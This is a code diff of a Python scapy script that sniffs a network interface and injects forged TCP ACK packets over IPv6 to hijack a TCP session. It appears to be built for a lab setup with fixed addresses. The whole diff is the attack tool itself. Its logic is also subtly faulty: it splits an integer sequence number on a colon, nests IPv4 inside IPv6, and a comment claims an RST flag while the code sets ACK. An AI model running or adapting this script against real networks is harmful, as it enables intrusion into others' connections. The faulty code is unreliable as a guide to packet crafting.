@@ -2,11 +2,8 @@
 
 from scapy.all import *
 
-
-
-
-# The script sniffs the channel on ens34 (on the attacker machine) and looks for TCP traffic (Sync-ACK) packet,
-# then crafts a new TCP packet with "A" flag to hijack the TCP session and forwards the crafted packet accordingly.
+# The script sniffs the channel on ens34 and looks for TCP Sync-ACK packet,
+# then crafts new TCP pcket with "A" flag and forwards it accordingly, in order to hijack the TCP session.
 
 # function to process the packet
 def process_packet(packet):
@@ -33,11 +30,21 @@ def process_packet(packet):
             # Send the packet
             sendp(pkt, iface='ens34')
 
-        if TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'P':
-            # Extract the TCP sequence number from the packet
-            sequence_number = packet[TCP].seq
-            # Extract the last ACK number (before colon) and add 1 to it to get the new ACK number
-            new_ack_number = int(sequence_number.split(':')[1])
+
+        # Time for "P" Flag Packet
+        elif TCP in packet and packet[IPv6].dst == "2001:db8:0:1::2" and packet[TCP].flags == 'PA':
+            sequence_number_range = str(packet[TCP].seq)            
+            if ':' in sequence_number_range:
+                # Sequence number has two parts (e.g., 1:30), grab the second part as ACK number
+                seq_parts = sequence_number_range.split(':')
+                seq_number = int(seq_parts[1])
+                new_ack_number = seq_number
+            else:
+                # Sequence number has one part, grab it normally and set it as ACK number
+                seq_number = int(sequence_number_range)
+                new_ack_number = seq_number                
+
+            print(f"The found seq number:{seq_number}")
             eth = Ether(dst='00:0c:29:18:4c:dc', src='00:0c:29:47:e7:c0')
             # Create the IPv6 layer
             ipv6 = IPv6(src='2001:db8:0:1::2', dst='2001:db8:2::2')
@@ -47,11 +54,9 @@ def process_packet(packet):
             dst_port = packet[TCP].sport
             # Create the TCP layer with the RST flag set
             tcp = TCP(sport=src_port, dport=dst_port, ack=new_ack_number, window=29200, flags='A')
-
             # Create the packet by stacking the layers
             pkt = eth / ipv6 / ipv4 / tcp
-
             # Send the packet
             sendp(pkt, iface='ens34')
 
-sniff(iface='ens34', prn=process_packet, count=0)
+sniff(iface='ens34', prn=process_packet)
